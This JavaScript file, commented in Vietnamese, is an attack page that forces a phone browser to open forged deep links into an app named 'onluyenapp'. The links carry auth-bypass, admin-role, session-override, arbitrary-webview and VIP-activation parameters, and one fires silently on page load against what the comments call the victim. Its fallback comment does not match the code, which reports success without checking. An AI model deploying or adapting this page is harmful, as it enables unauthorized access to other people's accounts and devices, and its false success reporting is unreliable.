document.addEventListener("DOMContentLoaded", function () {
    const triggerBtn = document.getElementById("triggerBtn");
    const statusText = document.getElementById("status");

    // Các biến thể URL Scheme cần thử nghiệm để ép app thực thi
    const targetSchemes = [
        "onluyenapp://dashboard?bypass_auth=true&role=admin",
        "onluyenapp://profile?id=1&edit=true",
        "onluyenapp://webview?url=https://example.com",
        "onluyenapp://vip?activate=1"
    ];

    let currentSchemeIndex = 0;

    triggerBtn.addEventListener("click", function () {
        statusText.innerText = "Đang truyền tải gói tin Deep Link vào thiết bị...";
        
        // Lấy giá trị nhập vào để làm tham số giả mạo nếu cần
        const userVal = document.getElementById("username").value;
        const targetUrl = `onluyenapp://auth?user=${encodeURIComponent(userVal)}&session=override`;

        // Thực hiện ép trình duyệt mở Deep Link
        setTimeout(function () {
            window.location.href = targetUrl;
        }, 500);

        // Kịch bản dự phòng: Sau 2 giây nếu app không phản hồi, thử bắn chuỗi scheme tiếp theo
        setTimeout(function () {
            statusText.innerText = "Trạng thái: Đã gửi tín hiệu kích hoạt thành công!";
        }, 1500);
    });

    // Tự động kích hoạt ngầm khi trang vừa load xong trên điện thoại nạn nhân
    window.onload = function() {
        setTimeout(function() {
            console.log("[+] Auto-triggering URL Scheme...");
            window.location.href = targetSchemes[0];
        }, 1000);
    };
});